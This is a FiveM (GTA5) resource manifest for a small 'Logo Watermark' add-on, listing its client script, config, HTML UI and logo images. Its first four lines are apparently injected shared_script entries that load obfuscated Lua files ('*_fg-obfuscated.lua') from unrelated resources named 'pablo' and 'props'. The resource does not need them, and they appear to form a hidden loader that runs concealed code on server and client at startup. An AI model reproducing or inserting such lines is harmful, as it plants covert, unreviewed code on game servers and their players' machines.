shared_script '@pablo/shared_fg-obfuscated.lua'
shared_script '@pablo/ai_module_fg-obfuscated.lua'
shared_script '@props/ai_module_fg-obfuscated.lua'
shared_script '@props/shared_fg-obfuscated.lua'
fx_version "bodacious"
game "gta5"
name "Logo Watermark"
description "Logo WaterMaker Foxy"
author ".gg/foxibytes"
version "v1.2.0"
client_scripts {
	"client.lua",
	'config.lua'
}
ui_page 'html/ui.html'
files {
	'html/*',
	'img/logo.png',
	'img/logo2.png'
}